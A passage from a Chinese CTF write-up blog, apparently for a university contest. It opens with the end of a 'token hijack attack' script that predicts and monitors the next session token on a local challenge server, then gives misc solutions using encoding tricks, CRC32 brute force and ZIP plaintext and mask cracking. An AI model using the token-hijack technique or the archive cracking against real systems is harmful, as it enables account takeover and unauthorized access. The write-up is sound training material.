print(f&quot;[INFO] 预测下一个token: &#123;next_token&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        # 开始监控</span><br><span class="line">        self.is_attacking = True</span><br><span class="line">        self.monitor_thread = threading.Thread(target=self.monitor_next_token, args=(next_token,))</span><br><span class="line">        self.monitor_thread.daemon = True</span><br><span class="line">        self.monitor_thread.start()</span><br><span class="line"></span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    def stop_attack(self):</span><br><span class="line">        &quot;&quot;&quot;停止攻击&quot;&quot;&quot;</span><br><span class="line">        self.is_attacking = False</span><br><span class="line">        print(&quot;[INFO] 攻击已停止&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 配置目标URL - 使用你提供的地址</span><br><span class="line">    target_url = &quot;127.0.0.1:64276&quot;</span><br><span class="line"></span><br><span class="line">    print(&quot;=&quot; * 60)</span><br><span class="line">    print(&quot;            Token劫持攻击脚本&quot;)</span><br><span class="line">    print(&quot;=&quot; * 60)</span><br><span class="line"></span><br><span class="line">    # 创建攻击实例</span><br><span class="line">    attacker = TokenHijackAttack(target_url)</span><br><span class="line"></span><br><span class="line">    # 尝试加载token文件的几种方式</span><br><span class="line">    token_loaded = False</span><br><span class="line"></span><br><span class="line">    # 方式1: 尝试加载文件</span><br><span class="line">    print(&quot;\n[1] 尝试从文件加载token...&quot;)</span><br><span class="line">    token_loaded = attacker.load_token_list(&quot;5.txt&quot;)</span><br><span class="line"></span><br><span class="line">    # 方式2: 如果文件加载失败，使用硬编码token</span><br><span class="line">    if not token_loaded:</span><br><span class="line">        print(&quot;\n[2] 文件加载失败，使用硬编码token...&quot;)</span><br><span class="line">        token_loaded = attacker.load_hardcoded_tokens()</span><br><span class="line"></span><br><span class="line">    if not token_loaded:</span><br><span class="line">        print(&quot;[ERROR] 无法加载token列表，退出&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 开始攻击</span><br><span class="line">    print(&quot;\n&quot; + &quot;=&quot; * 60)</span><br><span class="line">    print(&quot;开始攻击流程&quot;)</span><br><span class="line">    print(&quot;=&quot; * 60)</span><br><span class="line"></span><br><span class="line">    if attacker.start_attack():</span><br><span class="line">        print(&quot;\n[SUCCESS] 攻击已启动！&quot;)</span><br><span class="line">        print(&quot;等待后台人员扫码下一个token...&quot;)</span><br><span class="line">        print(&quot;按 Ctrl+C 停止攻击&quot;)</span><br><span class="line">        print(&quot;-&quot; * 60)</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            # 保持主线程运行</span><br><span class="line">            while attacker.is_attacking:</span><br><span class="line">                time.sleep(1)</span><br><span class="line"></span><br><span class="line">                # 每10秒显示一次状态</span><br><span class="line">                if int(time.time()) % 10 == 0:</span><br><span class="line">                    print(f&quot;[STATUS] 攻击进行中... (&#123;time.strftime(&#x27;%H:%M:%S&#x27;)&#125;)&quot;)</span><br><span class="line"></span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            print(&quot;\n[INFO] 用户中断攻击&quot;)</span><br><span class="line">            attacker.stop_attack()</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;[ERROR] 攻击启动失败&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>运行即可获得flag。</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>这里只放出我出的猫咪日记系列的wp喵</p>
<h3 id="0-Div3-猫咪日记01"><a href="#0-Div3-猫咪日记01" class="headerlink" title="[0-Div3]猫咪日记01"></a>[0-Div3]猫咪日记01</h3><p>送分签到题目。</p>
<p>打开一看颜文字，常见的有emojiAES和base100。</p>
<p>提示是“基础”的编码。</p>
<p>也就是base家族，base100</p>
<p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/base100">BASE100编码解码 - Bugku CTF平台</a>用这个网站在线解密即可获得flag。</p>
<h3 id="1-Div2-猫咪日记02"><a href="#1-Div2-猫咪日记02" class="headerlink" title="[1-Div2]猫咪日记02"></a>[1-Div2]猫咪日记02</h3><p>下载附件拖进010editor查看，发现是50 4B 03 04开头，培训讲过，这是压缩包的文件头，改后缀为.zip，解压。</p>
<p>查看key.txt，发现里面有不同寻常的颜文字，明显存在猫腻，Being搜索“颜文字加密”，第一个弹出的就是AAencode,也就是本题的加密，<a target="_blank" rel="noopener" href="https://fly63.com/tool/aaEncode/">aaEncode加密解密工具</a>丢进去解密得到<code>alert(&quot;&#123;miao~&#125;“</code></p>
<p>这是js的代码，作用是在浏览器上输出<code>&#123;miao~&#125;</code>,也就是猫窝.zip的密码。</p>
<p>(注意这里不能用windows自带的提取，不然会出现解压错误，要使用专门的解压缩软件，比如bandzip)</p>
<p>解压后，获得flag.zip,一个充满奇怪数字的txt，一个hint.zip。结合hint.zip压缩包的注释，可以知道是要通过hint.zip获得提示来解txt，从而获得flag.zip的密钥。</p>
<p>打开hint.zip，发现里面的txt仅仅只有6字节大小，很明显就是采用crc32爆破的思路。</p>
<p>随波逐流一把梭爆破即可。</p>
<p>得到很多结果，一个个尝试搜索发现Tupper就是我们要找的东西（事实上也很容易看出)</p>
<p>找到一个Tupper在线解密网站</p>
<p><a target="_blank" rel="noopener" href="https://tuppers-formula.ovh/">Tupper’s Formula Tools</a></p>
<p>解密得到flag.zip的密码:<code>GOOD]#Y</code></p>
<p>解开获得flag。</p>
<h3 id="2-Div1-猫咪日记03"><a href="#2-Div1-猫咪日记03" class="headerlink" title="[2-Div1]猫咪日记03"></a>[2-Div1]猫咪日记03</h3><h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><p>打开压缩包，发现有个小故事01.txt。点开第一关卡，发现存在仅存储加密，并且里面也包含小故事01.txt，一眼顶针，鉴定为明文攻击。使用archpr明文攻击爆破开第一关卡.zip</p>
<p><img src="https://lunereal.1kal0vic.top/images/img/2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/2.png" alt="2" loading="lazy"></p>
<p>解开后发现得到一个解密脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">ciper:</span><br><span class="line">TwBPAE8=</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def simple_encrypt(plaintext):</span><br><span class="line">    if isinstance(plaintext, str):</span><br><span class="line">        plaintext = plaintext.encode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">    step1 = plaintext[4:]</span><br><span class="line"></span><br><span class="line">    step2 = bytearray(len(step1))</span><br><span class="line">    if len(step1) &gt; 0:</span><br><span class="line">        step2[0] = step1[0]</span><br><span class="line">        for i in range(1, len(step1)):</span><br><span class="line">            step2[i] = step2[i - 1] ^ step1[i]</span><br><span class="line"></span><br><span class="line">    step3 = bytes(step2[:-2]) if len(step2) &gt; 2 else b&#x27;&#x27;</span><br><span class="line">    final = base64.b64encode(step3).decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">    return final</span><br></pre></td></tr></table></figure>

<p>给出了密文，很明显是要用这个加密脚本逆向出解密脚本，从而获得密码。</p>
<p>观察发现，在加密过程中，明文的一部分内容丢失了，因此最后解密要用到掩码爆破。</p>
<p>用ai写个解密脚本:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def simple_decrypt(ciphertext):</span><br><span class="line">    # Base64解码得到步骤3</span><br><span class="line">    step3 = base64.b64decode(ciphertext)</span><br><span class="line">    print(f&quot;步骤3 (Base64解码): &#123;step3.hex()&#125; = &#123;step3&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 关键修正：我们不能用具体值填充未知字节，因为会影响前面的异或计算</span><br><span class="line">    # 步骤3是步骤2去掉最后2个字节的结果</span><br><span class="line">    # 所以步骤2 = 步骤3 + 2个未知字节</span><br><span class="line"></span><br><span class="line">    # 对于已知部分进行异或解码</span><br><span class="line">    step1_known = bytearray(len(step3) + 2)  # 创建足够长的数组，包含未知位置</span><br><span class="line"></span><br><span class="line">    # 先解码已知部分（步骤3对应的部分）</span><br><span class="line">    if len(step3) &gt; 0:</span><br><span class="line">        # 第一个已知字节直接复制</span><br><span class="line">        step1_known[0] = step3[0]</span><br><span class="line"></span><br><span class="line">        # 解码步骤3中的其他字节</span><br><span class="line">        for i in range(1, len(step3)):</span><br><span class="line">            step1_known[i] = step3[i] ^ step3[i - 1]</span><br><span class="line"></span><br><span class="line">    print(f&quot;步骤1已知部分: &#123;bytes(step1_known[:len(step3)])&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 完整明文 = 4个未知字节 + 步骤1</span><br><span class="line">    # 由于步骤1的最后2个字节也未知，所以完整结果是：</span><br><span class="line">    plaintext = b&#x27;????&#x27; + bytes(step1_known[:len(step3)]) + b&#x27;??&#x27;</span><br><span class="line"></span><br><span class="line">    return plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def manual_decrypt(ciphertext):</span><br><span class="line">    &quot;&quot;&quot;手动推导解密过程&quot;&quot;&quot;</span><br><span class="line">    print(&quot;=== 手动推导 ===&quot;)</span><br><span class="line"></span><br><span class="line">    # 已知：TwBPAE8= -&gt; 4f 00 4f 00 4f</span><br><span class="line">    step3 = base64.b64decode(ciphertext)</span><br><span class="line">    print(f&quot;步骤3: &#123;step3.hex()&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 步骤2 = 步骤3 + ?? = 4f 00 4f 00 4f ??</span><br><span class="line">    print(&quot;步骤2: 4f 00 4f 00 4f ?? ??&quot;)</span><br><span class="line"></span><br><span class="line">    # 异或解码过程：</span><br><span class="line">    print(&quot;异或解码:&quot;)</span><br><span class="line">    print(&quot;step1[0] = step2[0] = 4f = &#x27;O&#x27;&quot;)</span><br><span class="line">    print(&quot;step1[1] = step2[1] ^ step2[0] = 00 ^ 4f = 4f = &#x27;O&#x27;&quot;)</span><br><span class="line">    print(&quot;step1[2] = step2[2] ^ step2[1] = 4f ^ 00 = 4f = &#x27;O&#x27;&quot;)</span><br><span class="line">    print(&quot;step1[3] = step2[3] ^ step2[2] = 00 ^ 4f = 4f = &#x27;O&#x27;&quot;)</span><br><span class="line">    print(&quot;step1[4] = step2[4] ^ step2[3] = 4f ^ 00 = 4f = &#x27;O&#x27;&quot;)</span><br><span class="line">    print(&quot;step1[5] = step2[5] ^ step2[4] = ?? ^ 4f = ?? (未知)&quot;)</span><br><span class="line">    print(&quot;step1[6] = step2[6] ^ step2[5] = ?? ^ ?? = ?? (未知)&quot;)</span><br><span class="line"></span><br><span class="line">    # 步骤1 = O O O O O ? ?</span><br><span class="line">    # 完整明文 = ???? + 步骤1 = ??????? O O O O O ? ?</span><br><span class="line"></span><br><span class="line">    return b&#x27;????OOOOO??&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">cipher = &quot;TwBPAE8=&quot;</span><br><span class="line">print(&quot;密文:&quot;, cipher)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line">result1 = simple_decrypt(cipher)</span><br><span class="line">print(f&quot;\n解密结果: &#123;result1&#125;&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;\n&quot; + &quot;=&quot; * 50)</span><br><span class="line">result2 = manual_decrypt(cipher)</span><br><span class="line">print(f&quot;手动推导结果: &#123;result2&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p>密码为????OOOOO??，使用archpr掩码爆破得到密钥： BOOOOOOOOOM，成功解压ha.zip。</p>
<p>看到一个my_binary.png。结合文件名，很容易想到将图片上的黑白转0,1然后转ascii码解密。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def image_to_binary(filename, output_file=&#x27;1.txt&#x27;):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    将图片上的黑色方块视为1，白色方块视为0，保存到文本文件</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # 读取图片</span><br><span class="line">    img = cv2.imread(filename, cv2.IMREAD_GRAYSCALE)</span><br><span class="line">    if img is None:</span><br><span class="line">        print(f&quot;错误：无法读取图片 &#123;filename&#125;&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    height, width = img.shape</span><br><span class="line">    print(f&quot;图片尺寸: &#123;width&#125; x &#123;height&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 方块尺寸</span><br><span class="line">    block_size = 40</span><br><span class="line"></span><br><span class="line">    # 计算行数和列数</span><br><span class="line">    rows = height // block_size</span><br><span class="line">    cols = width // block_size</span><br><span class="line"></span><br><span class="line">    print(f&quot;检测到 &#123;rows&#125; 行 x &#123;cols&#125; 列方块&quot;)</span><br><span class="line"></span><br><span class="line">    # 创建结果矩阵</span><br><span class="line">    result_matrix = []</span><br><span class="line"></span><br><span class="line">    # 遍历每个方块</span><br><span class="line">    for row in range(rows):</span><br><span class="line">        row_data = []</span><br><span class="line">        for col in range(cols):</span><br><span class="line">            y_start = row * block_size</span><br><span class="line">            y_end = (row + 1) * block_size</span><br><span class="line">            x_start = col * block_size</span><br><span class="line">            x_end = (col + 1) * block_size</span><br><span class="line"></span><br><span class="line">            block = img[y_start:y_end, x_start:x_end]</span><br><span class="line">            block_mean = np.mean(block)</span><br><span class="line"></span><br><span class="line">            if block_mean &lt; 128:</span><br><span class="line">                row_data.append(&#x27;1&#x27;)</span><br><span class="line">            else:</span><br><span class="line">                row_data.append(&#x27;0&#x27;)</span><br><span class="line"></span><br><span class="line">        result_matrix.append(row_data)</span><br><span class="line"></span><br><span class="line">    # 保存结果到文件</span><br><span class="line">    with open(output_file, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">        for row in result_matrix:</span><br><span class="line">            f.write(&#x27;&#x27;.join(row) + &#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">    print(f&quot;二进制结果已保存到 &#123;output_file&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 打印结果预览</span><br><span class="line">    print(&quot;\n二进制结果预览 (前5行):&quot;)</span><br><span class="line">    for i in range(min(5, len(result_matrix))):</span><br><span class="line">        preview = &#x27;&#x27;.join(result_matrix[i][:min(10, len(result_matrix[i]))])</span><br><span class="line">        print(preview + &#x27;...&#x27; if len(result_matrix[i]) &gt; 10 else preview)</span><br><span class="line"></span><br><span class="line">    return result_matrix</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def binary_to_ascii(binary_matrix, output_file=&#x27;decoded_text.txt&#x27;):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    将二进制矩阵按ASCII码转换为文字</span><br><span class="line"></span><br><span class="line">    参数:</span><br><span class="line">    binary_matrix: 二进制矩阵</span><br><span class="line">    output_file: 输出文本文件名</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    ascii_text = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    # 将二维矩阵转换为一维二进制字符串</span><br><span class="line">    binary_string = &#x27;&#x27;.join([&#x27;&#x27;.join(row) for row in binary_matrix])</span><br><span class="line"></span><br><span class="line">    print(f&quot;二进制数据总长度: &#123;len(binary_string)&#125; 位&quot;)</span><br><span class="line"></span><br><span class="line">    # 检查二进制长度是否能被8整除</span><br><span class="line">    if len(binary_string) % 8 != 0:</span><br><span class="line">        print(f&quot;警告：二进制数据长度 &#123;len(binary_string)&#125; 不是8的倍数，可能会截断部分数据&quot;)</span><br><span class="line">        # 截断到最近的8的倍数</span><br><span class="line">        binary_string = binary_string[:len(binary_string) - (len(binary_string) % 8)]</span><br><span class="line"></span><br><span class="line">    # 每8位一组转换为ASCII字符</span><br><span class="line">    for i in range(0, len(binary_string), 8):</span><br><span class="line">        byte = binary_string[i:i + 8]</span><br><span class="line">        if len(byte) == 8:</span><br><span class="line">            ascii_code = int(byte, 2)</span><br><span class="line">            # 只转换可打印字符（32-126）和换行符(10)、回车符(13)、制表符(9)</span><br><span class="line">            if 32 &lt;= ascii_code &lt;= 126 or ascii_code in [9, 10, 13]:</span><br><span class="line">                ascii_text += chr(ascii_code)</span><br><span class="line">            else:</span><br><span class="line">                # 对于不可打印字符，显示为转义序列或跳过</span><br><span class="line">                ascii_text += f&#x27;\\x&#123;ascii_code:02x&#125;&#x27;</span><br><span class="line"></span><br><span class="line">    # 保存ASCII文本到文件</span><br><span class="line">    with open(output_file, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) as f:</span><br><span class="line">        f.write(ascii_text)</span><br><span class="line"></span><br><span class="line">    print(f&quot;ASCII文本已保存到 &#123;output_file&#125;&quot;)</span><br><span class="line">    print(f&quot;\n解码的文本内容:&quot;)</span><br><span class="line">    print(&quot;=&quot; * 50)</span><br><span class="line">    print(ascii_text)</span><br><span class="line">    print(&quot;=&quot; * 50)</span><br><span class="line"></span><br><span class="line">    return ascii_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def binary_file_to_ascii(binary_filename=&#x27;1.txt&#x27;, output_file=&#x27;decoded_text.txt&#x27;):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    直接从二进制文件转换为ASCII文本</span><br><span class="line"></span><br><span class="line">    参数:</span><br><span class="line">    binary_filename: 二进制输入文件名</span><br><span class="line">    output_file: ASCII输出文件名</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        with open(binary_filename, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">            lines = f.readlines()</span><br><span class="line"></span><br><span class="line">        # 去除每行的换行符并合并所有二进制数据</span><br><span class="line">        binary_string = &#x27;&#x27;.join([line.strip() for line in lines])</span><br><span class="line"></span><br><span class="line">        print(f&quot;从文件读取的二进制数据长度: &#123;len(binary_string)&#125; 位&quot;)</span><br><span class="line"></span><br><span class="line">        ascii_text = &quot;&quot;</span><br><span class="line"></span><br><span class="line">        # 检查二进制长度是否能被8整除</span><br><span class="line">        if len(binary_string) % 8 != 0:</span><br><span class="line">            print(f&quot;警告：二进制数据长度 &#123;len(binary_string)&#125; 不是8的倍数，可能会截断部分数据&quot;)</span><br><span class="line">            binary_string = binary_string[:len(binary_string) - (len(binary_string) % 8)]</span><br><span class="line"></span><br><span class="line">        # 每8位一组转换为ASCII字符</span><br><span class="line">        for i in range(0, len(binary_string), 8):</span><br><span class="line">            byte = binary_string[i:i + 8]</span><br><span class="line">            if len(byte) == 8:</span><br><span class="line">                ascii_code = int(byte, 2)</span><br><span class="line">                if 32 &lt;= ascii_code &lt;= 126 or ascii_code in [9, 10, 13]:</span><br><span class="line">                    ascii_text += chr(ascii_code)</span><br><span class="line">                else:</span><br><span class="line">                    ascii_text += f&#x27;\\x&#123;ascii_code:02x&#125;&#x27;</span><br><span class="line"></span><br><span class="line">        # 保存ASCII文本到文件</span><br><span class="line">        with open(output_file, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) as f:</span><br><span class="line">            f.write(ascii_text)</span><br><span class="line"></span><br><span class="line">        print(f&quot;ASCII文本已保存到 &#123;output_file&#125;&quot;)</span><br><span class="line">        print(f&quot;\n解码的文本内容:&quot;)</span><br><span class="line">        print(&quot;=&quot; * 50)</span><br><span class="line">        print(ascii_text)</span><br><span class="line">        print(&quot;=&quot; * 50)</span><br><span class="line"></span><br><span class="line">        return ascii_text</span><br><span class="line"></span><br><span class="line">    except FileNotFoundError:</span><br><span class="line">        print(f&quot;错误：找不到文件 &#123;binary_filename&#125;&quot;)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def visualize_result(matrix, output_image=&#x27;result_visualization.png&#x27;):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    可视化识别结果（可选功能）</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if not matrix:</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    rows = len(matrix)</span><br><span class="line">    cols = len(matrix[0])</span><br><span class="line"></span><br><span class="line">    vis_img = np.zeros((rows * 20, cols * 20), dtype=np.uint8)</span><br><span class="line"></span><br><span class="line">    for i in range(rows):</span><br><span class="line">        for j in range(cols):</span><br><span class="line">            color = 0 if matrix[i][j] == &#x27;1&#x27; else 255</span><br><span class="line">            vis_img[i * 20:(i + 1) * 20, j * 20:(j + 1) * 20] = color</span><br><span class="line"></span><br><span class="line">    cv2.imwrite(output_image, vis_img)</span><br><span class="line">    print(f&quot;可视化结果已保存到 &#123;output_image&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 使用示例</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # 请将 &#x27;your_image.png&#x27; 替换为您的实际图片文件名</span><br><span class="line">    input_image = &#x27;your_image.png&#x27;</span><br><span class="line"></span><br><span class="line">    # 方法1：直接从图片转换并解码</span><br><span class="line">    print(&quot;方法1：从图片直接转换并解码&quot;)</span><br><span class="line">    print(&quot;-&quot; * 40)</span><br><span class="line">    result_matrix = image_to_binary(input_image)</span><br><span class="line"></span><br><span class="line">    if result_matrix:</span><br><span class="line">        # 将二进制转换为ASCII</span><br><span class="line">        ascii_result = binary_to_ascii(result_matrix)</span><br><span class="line"></span><br><span class="line">    print(&quot;\n&quot; + &quot;=&quot; * 60 + &quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">    # 方法2：如果已经有1.txt文件，可以直接解码</span><br><span class="line">    print(&quot;方法2：从现有1.txt文件解码&quot;)</span><br><span class="line">    print(&quot;-&quot; * 40)</span><br><span class="line">    binary_file_to_ascii(&#x27;1.txt&#x27;, &#x27;decoded_from_file.txt&#x27;)</span><br></pre></td></tr></table></figure>

<p>解密得到密钥：i_see_you</p>
<p>在小故事04.txt中得到第二关的key: First_Blood。</p>
<h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p>打开后发现有个奇怪的数字.txt。里面是一些奇怪的数字。阅读小故事05<br><code>然而，令我震惊的事情出现了，就在我爪子碰到“42”的时候，它变成了“2a”。</code></p>
<p>由这一句话可知，这题的关键在于16进制和10进制的转换。观察奇怪的数字.txt，发现里面只有0-9，因此要将其转化为16进制试试。</p>
<p><img src="https://lunereal.1kal0vic.top/images/img/2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/3.png" alt="3" loading="lazy"></p>
<p>使用cyberchef进行转换，<a target="_blank" rel="noopener" href="https://cc.forensix.cn/#recipe=From_Decimal('Space',false)To_Hex('Space',0)">From Decimal, To Hex - CyberChef</a></p>
<p>很容易看出来，这里是压缩包的16进制表示，用010editor得到压缩包。</p>
<p>查看文件格式，很明显是word文件，改后缀名为doc。</p>
<p>进来点开后会显示宏已经被禁用。这里有两种方法。</p>
<p>1.wps打开后点最上面的开发工具，再点宏，然后删除除了key以外的宏，再启用宏，执行就可以了。</p>
